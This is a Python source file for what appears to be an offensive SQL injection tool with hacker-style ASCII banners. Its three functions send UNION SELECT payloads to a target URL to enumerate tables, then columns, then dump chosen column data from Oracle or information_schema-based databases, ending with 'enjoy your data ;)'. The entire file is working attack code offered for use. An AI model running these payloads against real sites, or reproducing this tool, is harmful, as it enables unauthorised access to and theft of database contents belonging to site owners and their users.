import requests
from bs4 import BeautifulSoup
from rich import print
from rich.prompt import Prompt


def exploit_table(url, injection_point, type, count, string):
    from rich import print

    # Import necessary libraries

    if type == "Oracle":
        # If type is Oracle
        null = 'null,' * count
        # Remove the last comma from null
        null = null[:-1]

        payload_1 = f"'union select {null} from all_tables--"

        prima_occasione = payload_1.find("null")

        seconda_occasione = payload_1.find("null", string + 1)

        if seconda_occasione != -1:
            # If the second occurrence is found
            nuova_frase = payload_1[:seconda_occasione] + "table_name" + payload_1[seconda_occasione + len("null"):]
            # Modify the payload to inject the 'table_name' column

            attack = requests.get(f"{url}{injection_point}{nuova_frase}")
            # Send the request

            soup = BeautifulSoup(attack.text, "html.parser")
            # Parse the response using BeautifulSoup

            tables = soup.find_all('th')
            # Find all the <th> tags in the response

            print('''[green]            
             _______       __    __             
            |       .---.-|  |--|  .-----.-----.
            |.|   | |  _  |  _  |  |  -__|__ --|
            `-|.  |-|___._|_____|__|_____|_____|
              |:  |                             
              |::.|  ‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ SQLI tables ùçñùçñùçñ]----                           
              `---' ''')
            # Print a banner

            for table in tables:
                print(f"[yellow]{table.text}")
                # Print the content of each <th> tag (table names)
        
            table = Prompt.ask("\n\n[bold green]‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ inject your table ùçñùçñùçñ]----> ")
            # Ask the user to select a table

            return table
            # Return the user-selected table
       

    else:
        # If type is not Oracle
        null = 'null,' * count
        # Remove the last comma from null
        null = null[:-1]

        payload_1 = f"'union select {null} from information_schema.tables--"

        prima_occasione = payload_1.find("null")

        seconda_occasione = payload_1.find("null", string + 1)

        if seconda_occasione != -1:
            # If the second occurrence is found
            nuova_frase = payload_1[:seconda_occasione] + "table_name" + payload_1[seconda_occasione + len("null"):]
            # Modify the payload to inject the 'table_name' column

            attack = requests.get(f"{url}{injection_point}{nuova_frase}")
            # Send the request

            soup = BeautifulSoup(attack.text, "html.parser")
            # Parse the response using BeautifulSoup

            tables = soup.find_all('th')
            # Find all the <th> tags in the response

            print('''[green]      
             _______       __    __             
            |       .---.-|  |--|  .-----.-----.
            |.|   | |  _  |  _  |  |  -__|__ --|
            `-|.  |-|___._|_____|__|_____|_____|
              |:  |                             
              |::.|  ‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ SQLI tables ùçñùçñùçñ]----                           
              `---'                                                                     
''')
            # Print a banner

            for table in tables:
                print(f"[yellow]{table.text}")
                # Print the content of each <th> tag (table names)
        
            table = Prompt.ask("\n\n[bold green]‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ inject your table ùçñùçñùçñ]----> ")
            # Ask the user to select a table

            return table
            # Return the user-selected table





import requests
from bs4 import BeautifulSoup

def exploit_columns(url, injection_point, type, count, string, table):
    from rich import print

    # Import necessary libraries

    if type == "Oracle":
        # If type is Oracle
        null = 'null,' * count
        # Remove the last comma from null
        null = null[:-1]

        payload_1 = f"'union select {null} from all_tab_columns where table_name = '{table}'--"
        # Payload to fetch column names from 'all_tab_columns' table

        prima_occasione = payload_1.find("null")

        seconda_occasione = payload_1.find("null", string + 1)

        if seconda_occasione != -1:
            # If the second occurrence is found
            nuova_frase = payload_1[:seconda_occasione] + "column_name" + payload_1[seconda_occasione + len("null"):]
            # Modify the payload to inject the 'column_name' column

            attack = requests.get(f"{url}{injection_point}{nuova_frase}")
            # Send the request

            soup = BeautifulSoup(attack.text, "html.parser")
            # Parse the response using BeautifulSoup

            columns = soup.find_all('th')
            # Find all the <th> tags in the response

            print(''' [green]     
             _______       __                            
            |   _   .-----|  .--.--.--------.-----.-----.
            |.  1___|  _  |  |  |  |        |     |__ --|
            |.  |___|_____|__|_____|__|__|__|__|__|_____|
            |:  1   |                                    
            |::.. . |  ‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ SQLI columns ùçñùçñùçñ]---->                                  
            `-------'                                                                                                                              
''')
            # Print a banner

            for column in columns:
                print(f"[yellow]{column.text}")
                # Print the content of each <th> tag (column names)
        
            column_1 = Prompt.ask("\n[bold green]‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ inject your first column ùçñùçñùçñ]----> ")

            column_2 = Prompt.ask("[bold green]‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ inject your second column ùçñùçñùçñ]----> ")
            # Ask the user to select two columns

            return column_1, column_2
            # Return the user-selected columns
       

    else:
        # If type is not Oracle
        null = 'null,' * count
        # Remove the last comma from null
        null = null[:-1]

        payload_1 = f"'union select {null} from information_schema.columns where table_name = '{table}'--"
        # Payload to fetch column names from 'information_schema.columns' table

        prima_occasione = payload_1.find("null")

        seconda_occasione = payload_1.find("null", string + 1)

        if seconda_occasione != -1:
            # If the second occurrence is found
            nuova_frase = payload_1[:seconda_occasione] + "column_name" + payload_1[seconda_occasione + len("null"):]
            # Modify the payload to inject the 'column_name' column

            attack = requests.get(f"{url}{injection_point}{nuova_frase}")
            # Send the request

            soup = BeautifulSoup(attack.text, "html.parser")
            # Parse the response using BeautifulSoup

            columns = soup.find_all('th')
            # Find all the <th> tags in the response

            print('''[green]      
             _______       __                            
            |   _   .-----|  .--.--.--------.-----.-----.
            |.  1___|  _  |  |  |  |        |     |__ --|
            |.  |___|_____|__|_____|__|__|__|__|__|_____|
            |:  1   |                                    
            |::.. . |  ‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ SQLI columns ùçñùçñùçñ]---->                                  
            `-------'                                                                                                                              
''')
            # Print a banner

            for column in columns:
                print(f"[yellow]{column.text}")
                # Print the content of each <th> tag (column names)
        
            column_1 = Prompt.ask("\n[bold green]‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ inject your first column ùçñùçñùçñ]----> ")

            column_2 = Prompt.ask("[bold green]‚ïè‚ï†‚ïê‚ïê[ùçñùçñùçñ inject your second column ùçñùçñùçñ]----> ")
            # Ask the user to select two columns

            return column_1, column_2
            # Return the user-selected columns



import requests
from bs4 import BeautifulSoup

def showing_data(url, injection_point, type, count, string, table, column_1, column_2):
    from rich import print

    # Import necessary libraries

    if type == "Oracle":
        # If type is Oracle
        null = 'null,' * count
        # Remove the last comma from null
        null = null[:-1]

        payload_1 = f"'union select {null} from {table}--"
        # Payload to fetch data from the specified table

        prima_occasione = payload_1.find("null")

        seconda_occasione = payload_1.find("null", string + 1)

        if seconda_occasione != -1:
            # If the second occurrence is found
            nuova_frase = payload_1[:seconda_occasione] + f"{column_1} || ' ' || {column_2}" + payload_1[seconda_occasione + len("null"):]
            # Modify the payload to inject the specified columns

            attack = requests.get(f"{url}{injection_point}{nuova_frase}")
            # Send the request

            soup = BeautifulSoup(attack.text, "html.parser")
            # Parse the response using BeautifulSoup

            datas = soup.find_all('th')
            # Find all the <th> tags in the response

            print(''' [green]     
             ______         __         
            |   _  \ .---.-|  |_.---.-.
            |.  |   \|  _  |   _|  _  |
            |.  |    |___._|____|___._|
            |:  1    /                 
            |::.. . /  ‚ïè‚ï†‚ïê‚ïê[ùçñ enjoy your data ;) ùçñ]---->                
            `------'                                                                                                                           
''')
            # Print a banner

            for data in datas:
                print(f"[yellow]{data.text}")
                # Print the content of each <th> tag (data)
    

    else:
        # If type is not Oracle
        null = 'null,' * count
        # Remove the last comma from null
        null = null[:-1]

        payload_1 = f"'union select {null} from {table}--"
        # Payload to fetch data from the specified table

        prima_occasione = payload_1.find("null")

        seconda_occasione = payload_1.find("null", string + 1)

        if seconda_occasione != -1:
            # If the second occurrence is found
            nuova_frase = payload_1[:seconda_occasione] + f"{column_1} || ' ' || {column_2}" + payload_1[seconda_occasione + len("null"):]
            # Modify the payload to inject the specified columns

            attack = requests.get(f"{url}{injection_point}{nuova_frase}")
            # Send the request

            soup = BeautifulSoup(attack.text, "html.parser")
            # Parse the response using BeautifulSoup

            datas = soup.find_all('th')
            # Find all the <th> tags in the response

            print('''  [green]    
             ______         __         
            |   _  \ .---.-|  |_.---.-.
            |.  |   \|  _  |   _|  _  |
            |.  |    |___._|____|___._|
            |:  1    /                 
            |::.. . /  ‚ïè‚ï†‚ïê‚ïê[ùçñ enjoy your data ;) ùçñ]---->                
            `------'                                                                                                                           
''')
            # Print a banner

            for data in datas:
                print(f"[yellow]{data.text}")
                # Print the content of each <th> tag (data)

